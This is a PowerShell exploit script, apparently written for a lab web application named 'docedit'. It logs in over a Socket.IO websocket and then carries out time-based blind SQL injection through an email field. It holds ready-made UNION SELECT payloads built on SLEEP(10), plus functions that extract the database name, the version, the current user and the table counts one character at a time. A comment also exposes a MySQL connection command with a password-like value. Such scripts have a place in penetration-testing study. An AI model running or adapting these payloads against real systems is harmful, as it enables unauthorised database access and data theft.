# connect to mysql
# mysql --host=localhost --user=docedit --password=80c2680bb8b8113d57147c25bd371f2b7cffcfa22a9456d444f97ad6f92b70ce docedit
Import-Module -Name '.\PoshWebSocketClient'
#$debug=$true
$usr_email='test@test.com'
$usr_name='test'
$pass='test'
$register_user_str = "42[`"postRegister`",{`"firstName`":`"$usr_name`",`"lastName`":`"$usr_name`",`"email`":`"$usr_email`",`"password1`":`"$pass`",`"password2`":`"$pass`"}]"
$login_str = "42[`"postLogin`",{`"email`":`"$usr_email`",`"password`":`"$pass`"}]"
$save_doc_str = "42[`"saveDocument`",{{`"title`":`"<b>apples</b>`",`"content`":`"<b>apples</b>`",`"id`":`"1`",`"token`":`"{0}`"}}]"
$save_new_doc_str = "42[`"saveDocument`",{{`"title`":`"<b>apples</b>`",`"content`":`"<b>apples</b>`",`"token`":`"{0}`"}}]"


$check_email = "42[`"checkEmail`",{{`"token`":`"{0}`",`"email`":`"{1}`"}}]"
# sqli within the email field
$tag_email_str = "42[`"addTag`",{`"email`":`"{0}`",`"docid`":`"1`",`"token`":`"{1}`"}]"





$RegisterUser = @{
  SocketId = 0
  Message = $register_user_str
}
$LoginUser = @{
  SocketId = 0
  Message = $login_str
}

$SaveDoc = @{
  SocketId = 0
  Message = $save_doc_str
}


Write-Output "Initiating Connection"
Connect-Websocket -Uri "ws://docedit/socket.io/?EIO=3&transport=websocket&t=NMxgB5J&sid="
Receive-Message -SocketId 0 | out-Null
Receive-Message -SocketId 0 | Out-Null
$result = Send-Message -Message $register_user_str -SocketId 0
Write-Output "Registering User $($result.Status)"
Receive-Message -SocketId 0
#(Receive-Message -SocketId 0).Msg
$result = Send-Message -Message $login_str -SocketId 0
Write-Output "Logging In $($result.Status)"
$msg = Receive-Message -SocketId 0
$msg.msg
$json = $msg.Msg.substring(2)
$parsed_json = $json | ConvertFrom-Json
$token = $parsed_json.Token
$save_new_doc_str = $save_new_doc_str -f $token
$save_new_doc_str
$result = Send-Message -Message $save_new_doc_str -SocketId 0
Write-Output "Creating Document  $($result.Status)"
(Receive-Message -SocketId 0).Msg
(Receive-Message -SocketId 0).Msg
(Receive-Message -SocketId 0).Msg


# tag a user's email after creating a document, turns green on successful query, red on unsuccessfull query, and a secondary dialong mentioning 'Something went wrong during the queryerror during query' on sql syntax error
# searchByEmail on the user controller
# ' union select null,(select ascii(substring((select version()),1,1))=56),null,null,null,null,null,null-- 

<# Since the query always returns a statement I'm forced to use time based blind. 
' union select null,(SELECT IF((select ascii(substring((select version()),1,1))=56),(select sleep(10)), (select 'a'))),null,null,null,null,null,null-- 
#>

$strlen_sqli = "' union select null,(SELECT IF((select length(({0}))={1}),(select sleep(10)),(select 1))),null,null,null,null,null,null-- "
$extract_char_sqli = "' union select null,(SELECT IF((select ascii(substring(({0}),{1},1))={2}),(select sleep(10)),(select 1))),null,null,null,null,null,null-- "
$extract_count_sqli = "' union select null,(SELECT IF(({0})={1}),(select sleep(10)),(select 1))),null,null,null,null,null,null-- "
# add super user

# database name
# select database
# number of tables in the database
# SELECT count(*) AS TOTALNUMBEROFTABLES FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'docedit';
# number of columns in a table
# SELECT count(*) AS anyName FROM information_schema.columns WHERE table_name ='yourTableName'
# Via Timebased Blind
function Get-StringLength {
  param (
    [Parameter(Mandatory=$true)]
    [scriptblock] $SQLIScriptBlock,
    [Parameter(Mandatory=$true)]
    [scriptblock] $TransportScriptBlock,
    [Parameter(Mandatory=$true)]
    [string] $Query,
    [Parameter(Mandatory=$true)]
    [int] $MaxLength
  )
  $len = 0 
  for($i = 1; $i -le $MaxLength; ++$i) {
    $guess = Invoke-Command -ScriptBlock $SQLIScriptBlock -ArgumentList $i,$Query
    Write-Debug $guess
    $stopwatch = [System.Diagnostics.Stopwatch]::new()
    $stopwatch.Start()
    Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0, $debug
    $stopwatch.Stop()
    if($stopwatch.Elapsed.Seconds -ge 10) {
      Write-Debug "Time Elapsed: $($stopwatch.Elapsed)"
      $len = $i
      break
    }
    else { Write-Debug "$($stopwatch.Elapsed)" }
  }
  return $len
}

function Get-Count {
  param (
    [Parameter(Mandatory=$true)]
    [scriptblock] $SQLIScriptBlock,
    [Parameter(Mandatory=$true)]
    [scriptblock] $TransportScriptBlock,
    [Parameter(Mandatory=$true)]
    [string] $Query,
    [Parameter(Mandatory=$true)]
    [int] $MaxLength
  )
  $count = 0 
  for($i = 1; $i -le $MaxLength; ++$i) {
    $guess = Invoke-Command -ScriptBlock $SQLIScriptBlock -ArgumentList $i,$Query
    Write-Debug $guess
    $stopwatch = [System.Diagnostics.Stopwatch]::new()
    $stopwatch.Start()
    Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0, $debug
    $stopwatch.Stop()
    if($stopwatch.Elapsed.Seconds -ge 10) {
      Write-Debug "Time Elapsed: $($stopwatch.Elapsed)"
      $count = $i
      break
    }
    else { Write-Debug "$($stopwatch.Elapsed)" }
  }
  return $count
}

function Get-String {
  param (
      [Parameter(Mandatory=$true)]
      [scriptblock] $SQLIScriptBlock,
      [Parameter(Mandatory=$true)]
      [scriptblock] $TransportScriptblock,
      [Parameter(Mandatory=$true)]
      [string] $Query,
      [Parameter(Mandatory=$true)]
      [int[]] $CharacterSet,
      [Parameter(Mandatory=$true)]
      [int] $Length
  )
  $extracted_string=""
  for($i = 1; $i -le $Length; ++$i) {
    for($j = 0; $j -lt $CharacterSet.length; ++$j) {
      #Write-Output "$($CharacterSets.versionAsciiChars[$j])"
      #$guess = $check_email -f $token, ($extract_char_sqli -f "select version()","$i","$($CharacterSets.versionAsciiChars[$j])")
      $guess = Invoke-Command -ScriptBlock $SQLIScriptBlock -ArgumentList $Query, $i, $CharacterSet[$j]
      Write-Debug $guess
      $stopwatch = [System.Diagnostics.Stopwatch]::new()
      $stopwatch.Start()
      Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0, $debug
      #(Send-Message -Message $guess -SocketId 0).Msg
      #(Receive-Message -SocketId 0).Msg | Out-Null
      $stopwatch.Stop()
      if($stopwatch.Elapsed.Seconds -ge 10) {
        $temp = [int]$CharacterSet[$j]
        Write-Debug $temp 
        $temp = [char]$temp
        Write-Debug "Char Found: $temp"
        Write-Debug "Time Elapsed: $($stopwatch.Elapsed)"
        $extracted_string += $temp
        break
      }
      else {
      # Write-Output "$($stopwatch.Elapsed)"
      }
    }
  }
  return $extracted_string
}

$transport = {
  param($msg, $SocketId, $debug)
  if($debug) {
    (Send-Message -Message $msg -SocketId $SocketId).Msg 
    (Receive-Message -SocketId $SocketId).Msg
  }
  else {
    (Send-Message -Message $msg -SocketId $SocketId).Msg | Out-Null
    (Receive-Message -SocketId $SocketId).Msg | Out-Null
  }
}

$getLength = {
  param($len,$Query)
  $check_email -f $token, ($strlen_sqli -f "$Query","$len")
}
$extractString = {
  param($query, $index, $char) 
  $check_email -f $token, ($extract_char_sqli -f "$query","$index","$char")
}
# getCount
$getCountTables = {
  param($len, $Query)
  $check_email -f $token, ($extract_count_sqli -f "$Query","$len") 
}

$CharacterSets = @{
  versionAsciiChars = @(46,48,49,50,51,52,53,54,55,56,57)
  printableChars= 32..127
}
<#
$len = Get-StringLength -SQLIScriptBlock $getLength -TransportScriptBlock $transport -Query "select version()" -MaxLength 10
Write-Output "MySQL version string length: $len"
$mySQLVersion = Get-String -SQLIScriptBlock $extractString -TransportScriptBlock $transport -Query "select version()" -Characterset $CharacterSets.printableChars -Length $len
Write-Output "MySQL version: $mySQLVersion"

$len = Get-StringLength -SQLIScriptBlock $getLength -TransportScriptBlock $transport -Query "select current_user()" -MaxLength 20
Write-Output "Current User string length: $len"
$currentUser = Get-String -SQLIScriptBlock $extractString -TransportScriptBlock $transport -Query "select current_user()" -Characterset $CharacterSets.printableChars -Length $len
Write-Output "Current User: $currentUser"
#>

$len = Get-StringLength -SQLIScriptBlock $getLength -TransportScriptBlock $transport -Query "select database()" -MaxLength 10
Write-Output "Schema string length: $len"
$schema = Get-String -SQLIScriptBlock $extractString -TransportScriptBlock $transport -Query "select database()" -Characterset $CharacterSets.printableChars -Length $len
Write-Output "Schema Nane: $schema"


$num_tables = Get-Count -SQLIScriptBlock $getCountTables -TransportScriptBlock $transport -Query "select count(table_name) from information_schema.tables where table_schema='docedit'" -MaxLength 10 -Debug
Write-Output "Number of tables in $schema is $num_tables"


Remove-Module PoshWebSocketClient
